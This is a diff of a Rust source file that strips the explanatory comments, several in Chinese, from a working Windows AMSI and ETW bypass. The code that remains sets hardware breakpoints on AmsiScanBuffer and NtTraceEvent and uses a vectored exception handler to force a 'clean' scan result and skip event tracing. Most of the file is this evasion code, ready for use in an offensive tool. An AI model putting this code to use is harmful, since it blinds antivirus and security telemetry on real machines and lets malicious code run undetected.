@@ -1,12 +1,5 @@
-//! 硬件断点 patchless AMSI/ETW 绕过（HwBpEngine 思路的独立实现）。
 //!
-//! 原理：对当前线程在 `AmsiScanBuffer` / `NtTraceEvent` 入口设置硬件执行断点
-//! （Dr0/Dr1 + Dr7），注册最高优先级 VEH。断点触发（`STATUS_SINGLE_STEP`）时，
-//! VEH 直接改写 `CONTEXT` 的 `rax`/`rsp`/`rip`，让目标函数「原地返回」，从而
-//! 跳过扫描 / 遥测本体 —— 不改写任何内存字节（patchless）。
 //!
-//! 差异化：断点表用全局原子槽而非链表；VEH 内不再移除/恢复断点（`CONTEXT`
-//! 恢复天然保留 Dr 状态，避免在异常上下文里二次 syscall）；命名与结构独立。
 
 use core::sync::atomic::{AtomicUsize, Ordering};
 
@@ -23,14 +16,10 @@ const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
 const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
 const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
 
-/// AmsiScanBuffer / NtTraceEvent 的入口地址（初始化后只读）。
 static AMSI_BP_ADDR: AtomicUsize = AtomicUsize::new(0);
 static ETW_BP_ADDR: AtomicUsize = AtomicUsize::new(0);
 
-/// VEH 句柄（幂等安装）。
 static VEH_HANDLE: AtomicUsize = AtomicUsize::new(0);
-
-// ── 异常结构 ───────────────────────────────────────────────────────────
 
 #[repr(C)]
 struct ExceptionRecord {
@@ -75,9 +64,7 @@ unsafe extern "system" fn veh_handler(info: *mut ExceptionPointers) -> i32 {
     EXCEPTION_CONTINUE_SEARCH
 }
 
-/// AmsiScanBuffer：把 result 置 CLEAN，返回 S_OK，跳过本体。
 unsafe fn patch_amsi(ctx: &mut Context) {
-    // 第 6 参数 `AMSI_RESULT *result` 在 `[rsp + 0x30]`。
     let result_ptr = *((ctx.rsp + 0x30) as *const usize);
     if result_ptr != 0 {
         *(result_ptr as *mut u32) = 0; // AMSI_RESULT_CLEAN
@@ -86,28 +73,21 @@ unsafe fn patch_amsi(ctx: &mut Context) {
     skip_to_ret(ctx);
 }
 
-/// NtTraceEvent：直接跳过本体，不产生遥测。
 unsafe fn patch_etw(ctx: &mut Context) {
     skip_to_ret(ctx);
-    // rax 保持入口值（近似 NtTraceEvent 返回）
 }
 
-/// 把 `rip` 指向调用者的返回地址，`rsp` 跳过返回地址 —— 等价于目标函数返回。
 unsafe fn skip_to_ret(ctx: &mut Context) {
     let ret = *(ctx.rsp as *const usize);
     ctx.rsp += 8;
     ctx.rip = ret as u64;
 }
 
-// ── 硬件断点 ───────────────────────────────────────────────────────────
-
-/// 对当前线程在 `position`（0-3）设置执行断点到 `address`。
 unsafe fn set_bp(position: usize, address: usize) -> bool {
     if position > 3 || address == 0 {
         return false;
     }
 
-    // 打开当前线程的真实句柄（调试寄存器需要真实句柄，伪句柄无效）。
     let tid = GetCurrentThreadId();
     let client_id = ClientId {
         unique_process: std::process::id() as usize,
@@ -143,7 +123,6 @@ unsafe fn set_bp(position: usize, address: usize) -> bool {
             return false;
         }
     }
-    // 清 R/W 与 LEN（执行断点），置 local enable。
     ctx.dr7 &= !(3u64 << (16 + 4 * position));
     ctx.dr7 &= !(3u64 << (18 + 4 * position));
     ctx.dr7 |= 1u64 << (2 * position);
@@ -153,12 +132,7 @@ unsafe fn set_bp(position: usize, address: usize) -> bool {
     set == 0
 }
 
-// ── 安装 ───────────────────────────────────────────────────────────────
-
-/// 安装 AMSI/ETW patchless 绕过（幂等）。
 ///
-/// 对**当前线程**设置硬件断点；调用前需先 `crate::init()`。
-/// 注意：硬件断点是每线程的 —— 多线程执行场景需在执行线程上调用。
 pub unsafe fn install_amsi_etw_bypass() -> Result<(), &'static str> {
     if VEH_HANDLE.load(Ordering::Relaxed) != 0 {
         return Ok(());
@@ -201,7 +175,6 @@ mod tests {
 
     static TEST_ADDR: AtomicUsize = AtomicUsize::new(0);
 
-    /// 测试用 VEH：匹配 TEST_ADDR 的断点，rax 置假值并跳过本体。
     unsafe extern "system" fn test_veh(info: *mut ExceptionPointers) -> i32 {
         let rec = (*info).record;
         if !rec.is_null()
@@ -224,7 +197,6 @@ mod tests {
             let veh = RtlAddVectoredExceptionHandler(1, test_veh as *const () as usize);
             assert!(!veh.is_null(), "VEH registration failed");
 
-            // 断点打在 GetCurrentProcessId 上，触发后应返回假值而非真实 PID。
             let kernel32 = GetModuleHandleW(wide("kernel32.dll").as_ptr());
             let gpid = GetProcAddress(kernel32, b"GetCurrentProcessId\0".as_ptr()) as usize;
             assert!(gpid != 0, "GetCurrentProcessId must resolve");
